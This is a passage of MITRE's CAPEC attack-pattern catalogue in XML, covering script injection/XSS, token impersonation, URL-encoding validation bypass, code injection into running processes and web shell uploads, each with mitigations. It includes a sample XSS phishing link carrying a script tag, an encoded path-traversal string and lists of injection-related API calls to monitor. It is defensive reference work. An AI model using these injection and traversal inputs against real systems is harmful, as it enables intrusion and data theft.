         <ns0:Prerequisites>
            <ns0:Prerequisite>Target client software must be a client that allows scripting communication from remote hosts, such as a JavaScript-enabled Web Browser.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To achieve a redirection and use of less trusted source, an attacker can simply place a script in bulletin board, blog, wiki, or other user-generated content site that are echoed back to other client machines.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Use browser technologies that do not allow client side scripting.</ns0:Mitigation>
            <ns0:Mitigation>Design: Utilize strict type, character, and encoding enforcement</ns0:Mitigation>
            <ns0:Mitigation>Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform input validation for all remote content.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform output validation for all remote content.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Session tokens for specific host</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Classic phishing attacks lure users to click on content that appears trustworthy, such as logos, and links that seem to go to their trusted financial institutions and online auction sites. But instead the attacker appends malicious scripts into the otherwise innocent appearing resources. The HTML source for a standard phishing attack looks like this:</html:p>
               <html:div style="margin-left:1em;" class="attack">&lt;a href="www.exampletrustedsite.com?Name=&lt;script&gt;maliciousscript&lt;/script&gt;"&gt;Trusted Site&lt;/a&gt;</html:div>
               <html:p>When the user clicks the link, the appended script also executes on the local user's machine.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="79" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>08</ns0:Entry_ID>
               <ns0:Entry_Name>Cross-Site Scripting</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Cross Site Scripting (XSS)</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Simple Script Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="633" Name="Token Impersonation" Abstraction="Detailed" Status="Stable">
         <ns0:Description>An adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary.</ns0:Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="194">
               <ns0:Exclude_Related Exclude_ID="403" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This pattern of attack is only applicable when a downstream user leverages tokens to verify identity, and then takes action based on that identity.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Alter Execution Logic</ns0:Impact>
               <ns0:Note>By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
               <ns0:Note>By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Hide Activities</ns0:Impact>
               <ns0:Note>Faking the source of data or services can be used to create a false trail in logs as the target will associated any actions with the impersonated identity instead of the adversary.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="287" />
            <ns0:Related_Weakness CWE_ID="1270" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1134</ns0:Entry_ID>
               <ns0:Entry_Name>Access Token Manipulation</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2018-04-12</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="64" Name="Using Slashes and URL Encoding Combined to Bypass Validation Logic" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple ways of encoding a URL and abuse the interpretation of the URL. A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>The attacker accesses the server using a specific URL.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>The attacker crafts a malicious URL string request and sends it to the server.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters have harmful consequences.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The application accepts and decodes URL string request.</ns0:Prerequisite>
            <ns0:Prerequisite>The application performs insufficient filtering/canonicalization on the URLs.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An attacker can try special characters in the URL and bypass the URL validation.</ns0:Skill>
            <ns0:Skill Level="Medium">The attacker may write a script to defeat the input filtering mechanism.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>If the first decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.</ns0:Indicator>
            <ns0:Indicator>Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>Denial of Service</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.</ns0:Mitigation>
            <ns0:Mitigation>Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.</ns0:Mitigation>
            <ns0:Mitigation>When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.</ns0:Mitigation>
            <ns0:Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.</ns0:Mitigation>
            <ns0:Mitigation>Refer to the RFCs to safely decode URL.</ns0:Mitigation>
            <ns0:Mitigation>Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.</ns0:Mitigation>
            <ns0:Mitigation>There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Attack Example: Combined Encodings CesarFTP</html:p>
               <html:p>Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks.</html:p>
               <html:p>An attacker could provide a URL that included a string like</html:p>
               <html:div style="margin-left:1em;" class="informative">/...%5C/</html:div>
               <html:p>This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot.</html:p>See also: CVE-2001-1335</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="177" />
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="73" />
            <ns0:Related_Weakness CWE_ID="22" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-495" />
            <ns0:Reference External_Reference_ID="REF-496" />
            <ns0:Reference External_Reference_ID="REF-497" />
            <ns0:Reference External_Reference_ID="REF-498" Section="URL Encoding Reference" />
            <ns0:Reference External_Reference_ID="REF-499" />
            <ns0:Reference External_Reference_ID="REF-500" Section="5.11.4. Validating Hypertext Links (URIs/URLs)" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description Summary</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Obfuscation_Techniques, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Indicators, Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="640" Name="Inclusion of Code in Existing Process" Abstraction="Detailed" Status="Stable">
         <ns0:Description>The adversary takes advantage of a bug in an application failing to verify the integrity of the running process to execute arbitrary code in the address space of a separate live process. The adversary could use running code in the context of another process to try to access process's memory, system/network resources, etc. The goal of this attack is to evade detection defenses and escalate privileges by masking the malicious code under an existing legitimate process. Examples of approaches include but not limited to: dynamic-link library (DLL) injection, portable executable injection, thread execution hijacking, ptrace system calls, VDSO hijacking, function hooking, reflective code loading, and more.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="251" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine target process] The adversary determines a process with sufficient privileges that they wish to include code into.</ns0:Description>
               <ns0:Technique>On Windows, use the process explorer's security tab to see if a process is running with administror privileges.</ns0:Technique>
               <ns0:Technique>On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Attempt to include simple code with known output] The adversary attempts to include very simple code into the existing process to determine if the code inclusion worked. The code will differ based on the approach used to include code into an existing process.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Include arbitrary code into existing process] Once an adversary has determined that including code into the existing process is possible, they will include code for a targeted purpose, such as accessing that process's memory.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The targeted application fails to verify the integrity of the running process that allows an adversary to execute arbitrary code.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">Knowledge of how to load malicious code into the memory space of a running process, as well as the ability to have the running process execute this code. For example, with DLL injection, the adversary must know how to load a DLL into the memory space of another running process, and cause this process to execute the code inside of the DLL.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Prevent unknown or malicious software from loading through using an allowlist policy.</ns0:Mitigation>
            <ns0:Mitigation>Properly restrict the location of the software being used.</ns0:Mitigation>
            <ns0:Mitigation>Leverage security kernel modules providing advanced access control and process restrictions like SELinux.</ns0:Mitigation>
            <ns0:Mitigation>Monitor API calls like CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC, and similar for Windows.</ns0:Mitigation>
            <ns0:Mitigation>Monitor API calls like ptrace system call, use of LD_PRELOAD environment variable, dlfcn dynamic linking API calls, and similar for Linux.</ns0:Mitigation>
            <ns0:Mitigation>Monitor API calls like SetWindowsHookEx and SetWinEventHook which install hook procedures for Windows.</ns0:Mitigation>
            <ns0:Mitigation>Monitor processes and command-line arguments for unknown behavior related to code injection.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="114" />
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1505.005</ns0:Entry_ID>
               <ns0:Entry_Name>Server Software Component: Terminal Services DLL</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1574.006</ns0:Entry_ID>
               <ns0:Entry_Name>Hijack Execution Flow: Dynamic Linker Hijacking</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1574.013</ns0:Entry_ID>
               <ns0:Entry_Name>Hijack Execution Flow: KernelCallbackTable</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1620</ns0:Entry_ID>
               <ns0:Entry_Name>Reflective Code Loading</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2018-07-31</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Mitigations, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Related_Weaknesses, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="650" Name="Upload a Web Shell to a Web Server" Abstraction="Detailed" Status="Draft">
         <ns0:Description>By exploiting insufficient permissions, it is possible to upload a web shell to a web server in such a way that it can be executed remotely. This shell can have various capabilities, thereby acting as a "gateway" to the underlying web server. The shell might execute at the higher permission level of the web server, providing the ability the execute malicious code at elevated levels.</ns0:Description>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="17" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The web server is susceptible to one of the various web application exploits that allows for uploading a shell file.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Make sure your web server is up-to-date with all patches to protect against known vulnerabilities.</ns0:Mitigation>
            <ns0:Mitigation>Ensure that the file permissions in directories on the web server from which files can be execute is set to the "least privilege" settings, and that those directories contents is controlled by an allowlist.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="287" />
            <ns0:Related_Weakness CWE_ID="553" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1505.003</ns0:Entry_ID>
               <ns0:Entry_Name>Server Software Component:Web Shell</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2018-05-31</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="660" Name="Root/Jailbreak Detection Evasion via Hooking" Abstraction="Detailed" Status="Stable">
         <ns0:Description>An adversary forces a non-restricted mobile application to load arbitrary code or code files, via Hooking, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Adversaries may further leverage these capabilities to escalate privileges or bypass access control on legitimate applications. Although many mobile applications check if a mobile device is Rooted/Jailbroken prior to authorized use of the application, adversaries may be able to "hook" code in order to circumvent these checks. Successfully evading Root/Jailbreak detection allows an adversary to execute administrative commands, obtain confidential data, impersonate legitimate users of the application, and more.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="251" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
